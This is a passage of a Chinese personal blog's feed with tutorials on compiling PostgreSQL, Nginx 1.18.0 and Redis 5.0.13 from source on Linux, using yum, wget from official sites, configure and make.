class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install zlib-devel</span><br></pre></td></tr></table></figure><p>进入解压好的文件夹里面执行编译命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> postgresql-10.4</span><br><span class="line">./configure --prefix=/root/target/postgre <span class="comment">#指定编译目标文件夹</span></span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h4 id="3、安装完成"><a href="#3、安装完成" class="headerlink" title="3、安装完成"></a>3、安装完成</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@QLL3-5 postgre]<span class="comment"># ls</span></span><br><span class="line">bin  include  lib  share</span><br><span class="line">[root@QLL3-5 postgre]<span class="comment"># pwd</span></span><br><span class="line">/root/target/postgre</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;1、下载postgresql&quot;&gt;&lt;a href=&quot;#1、下载postgresql&quot; class=&quot;headerlink&quot; title=&quot;1、下载postgresql&quot;&gt;&lt;/a&gt;1、下载postgresql&lt;/h4&gt;&lt;p&gt;百度或者谷歌搜索postgresql dow</summary>
      
    
    
    
    <category term="安装" scheme="http://fireflyingup.github.io/categories/%E5%AE%89%E8%A3%85/"/>
    
    
    <category term="postgresql" scheme="http://fireflyingup.github.io/tags/postgresql/"/>
    
  </entry>
  
  <entry>
    <title>Linux源码编译安装Nginx</title>
    <link href="http://fireflyingup.github.io/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Nginx/"/>
    <id>http://fireflyingup.github.io/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Nginx/</id>
    <published>2021-09-23T16:44:20.000Z</published>
    <updated>2023-12-19T01:39:30.236Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1、nginx下载"><a href="#1、nginx下载" class="headerlink" title="1、nginx下载"></a>1、nginx下载</h4><p>整个安装步骤可以直接采用官方的<a href="https://docs.nginx.com/nginx/admin-guide/installing-nginx/installing-nginx-open-source/#sources">安装文档</a></p><p>使用wget命令下载nginx，这里以nginx 1.18.0 版本为例</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://nginx.org/download/nginx-1.18.0.tar.gz <span class="comment">#下载</span></span><br><span class="line">tar -zxvf nginx-1.18.0.tar.gz <span class="comment">#解压</span></span><br></pre></td></tr></table></figure><p>或者去<a href="http://nginx.org/en/download.html">nginx官网下载页面</a>下载安装包，页面如下</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Nginx/image-20210924103858604.png"></div></div><h4 id="2、必要模块安装"><a href="#2、必要模块安装" class="headerlink" title="2、必要模块安装"></a>2、必要模块安装</h4><p>下载PCRE，PCRE - Supports regular expressions. Required by the NGINX <a href="https://nginx.org/en/docs/ngx_core_module.html">Core</a> and <a href="https://nginx.org/en/docs/http/ngx_http_rewrite_module.html">Rewrite</a> modules.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://ftp.pcre.org/pub/pcre/pcre-8.44.tar.gz <span class="comment">#下载</span></span><br><span class="line">tar -zxvf pcre-8.44.tar.gz <span class="comment">#解压</span></span><br></pre></td></tr></table></figure><p>下载zlib, zlib - Supports header compression. Required by the NGINX <a href="https://nginx.org/en/docs/http/ngx_http_gzip_module.html">Gzip</a> module.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://zlib.net/zlib-1.2.11.tar.gz <span class="comment">#下载</span></span><br><span class="line">tar -zxvf zlib-1.2.11.tar.gz <span class="comment">#解压</span></span><br></pre></td></tr></table></figure><p>可以看到当前文件夹下面有以下文件</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Nginx/image-20210924125124462.png"></div></div><p>接下来我们依次进行编译</p><p>编译pcre-8.44</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> pcre-8.44</span><br><span class="line">./configure</span><br></pre></td></tr></table></figure><p>发现以下报错</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Nginx/image-20210924125702614.png"></div></div><p>原因是没有gcc-c++编译环境，输入以下命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc-c++</span><br><span class="line"><span class="comment">#完成安装之后继续编译pcre</span></span><br><span class="line">./configure</span><br></pre></td></tr></table></figure><p>出现如下页面表示成功</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Nginx/image-20210924130228697.png"></div></div><p>接下来执行以下命令，即pcre编译完成。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; make install </span><br></pre></td></tr></table></figure><p>编译zlib，执行过程和pcre一致，在这里不再重复。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> zlib-1.2.11</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h4 id="3、编译安装nginx"><a href="#3、编译安装nginx" class="headerlink" title="3、编译安装nginx"></a>3、编译安装nginx</h4><p>进入nginx目录，这里我选择将nginx编译后放入/root/target/nginx目录下面，这个目录你们可以自行配置，参数介绍官方的<a href="https://docs.nginx.com/nginx/admin-guide/installing-nginx/installing-nginx-open-source/#sources">安装文档</a>有很详细的介绍，这里我不在介绍。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> nginx-1.18.0</span><br><span class="line">./configure --sbin-path=/root/target/nginx --conf-path=/root/target/nginx/nginx.conf --pid-path=/root/target/nginx/nginx.pid --with-http_ssl_module --with-stream --with-pcre=../pcre-8.44 --with-zlib=../zlib-1.2.11 --without-http_empty_gif_module</span><br></pre></td></tr></table></figure><p>在运行上述命令的时候我发现了另一个问题，这个是没有OpenSSL的环境。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Nginx/image-20210924131144777.png"></div></div><p>我们执行以下命令来安装OpenSSL的环境</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install openssl openssl-devel</span><br></pre></td></tr></table></figure><p>然后在继续执行就可以了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --sbin-path=/root/target/nginx --conf-path=/root/target/nginx/nginx.conf --pid-path=/root/target/nginx/nginx.pid --with-http_ssl_module --with-stream --with-pcre=../pcre-8.44 --with-zlib=../zlib-1.2.11 --without-http_empty_gif_module</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>这样nginx的源码编译安装就大功告成了，附上一个nginx编译完成的截图。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Nginx/image-20210924131612064.png"></div></div><p>再附上一个安装到目标文件夹的截图。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Nginx/image-20210924131713603.png"></div></div><p>最后说一句，刚开始我准备使用nginx-1.9.15，可是后来在使用./configure的时候遇见了各种问题，后来就按照官方文档使用了稳定的nginx-1.18.0。</p><p>参考链接：</p><p>nginx官方文档：<a href="https://docs.nginx.com/nginx/admin-guide/installing-nginx/installing-nginx-open-source/#sources">https://docs.nginx.com/nginx/admin-guide/installing-nginx/installing-nginx-open-source/#sources</a></p><p>安装OpenSSL：<a href="https://blog.csdn.net/testcs_dn/article/details/51461999">https://blog.csdn.net/testcs_dn/article/details/51461999</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;1、nginx下载&quot;&gt;&lt;a href=&quot;#1、nginx下载&quot; class=&quot;headerlink&quot; title=&quot;1、nginx下载&quot;&gt;&lt;/a&gt;1、nginx下载&lt;/h4&gt;&lt;p&gt;整个安装步骤可以直接采用官方的&lt;a href=&quot;https://docs.nginx</summary>
      
    
    
    
    <category term="安装" scheme="http://fireflyingup.github.io/categories/%E5%AE%89%E8%A3%85/"/>
    
    
    <category term="nginx" scheme="http://fireflyingup.github.io/tags/nginx/"/>
    
  </entry>
  
  <entry>
    <title>Linux源码编译安装Redis</title>
    <link href="http://fireflyingup.github.io/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Redis/"/>
    <id>http://fireflyingup.github.io/2021/09/24/Linux%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Redis/</id>
    <published>2021-09-23T16:44:05.000Z</published>
    <updated>2023-12-19T01:39:20.097Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1、下载Redis"><a href="#1、下载Redis" class="headerlink" title="1、下载Redis"></a>1、下载Redis</h4><p>redis版本：5.0.13</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.redis.io/releases/redis-5.0.13.tar.gz <span class="comment">#下载redis</span></span><br><span class="line">tar -zxvf redis-5.0.13.tar.gz <span class="comment">#解压</span></span><br><span class="line"><span class="built_in">cd</span> redis-5.0.13</span><br></pre></td></tr></table></figure><h4 id="2、编译"><a href="#2、编译" class="headerlink" title="2、编译"></a>2、编译</h4><p>可以直接使用make &amp;&amp; make install，如果想要编译到指定文件夹的话，使用以下命令，注意一定要连在一起而且不能用&amp;&amp;，不然将不会编译到指定文件夹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make CFLAGS=<span class="string">&quot;-g -O0&quot;</span> PREFIX=/root/target/redis install</span><br></pre></td></tr></table></figure><p>如果缺少gcc-c++环境的话，使用以下命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc-c++</span><br></pre></td></tr></table></figure><h4 id="3、编译完成"><a href="#3、编译完成" class="headerlink" title="3、编译完成"></a>3、编译完成</h4><p>可以看到最后在指定文件夹下面出现了bin文件夹，编译完成。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@QLL3-5 bin]<span class="comment"># pwd</span></span><br><span class="line">/root/target/redis/bin</span><br><span class="line">[root@QLL3-5 bin]<span class="comment"># ls</span></span><br><span class="line">redis-benchmark  redis-check-aof  redis-check-rdb  redis-cli  redis-sentinel  redis-server</span><br><span class="line">[root@QLL3-5 bin]<span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;1、下载Redis&quot;&gt;&lt;a href=&quot;#1、下载Redis&quot; class=&quot;headerlink&quot; title=&quot;1、下载Redis&quot;&gt;&lt;/a&gt;1、下载Redis&lt;/h4&gt;&lt;p&gt;redis版本：5.0.13&lt;/p&gt;
&lt;figure class=&quot;highligh</summary>
      
    
    
    
    <category term="安装" scheme="http://fireflyingup.github.io/categories/%E5%AE%89%E8%A3%85/"/>
    
    
    <category term="redis" scheme="http://fireflyingup.github.io/tags/redis/"/>
    
  </entry>
  
</feed>
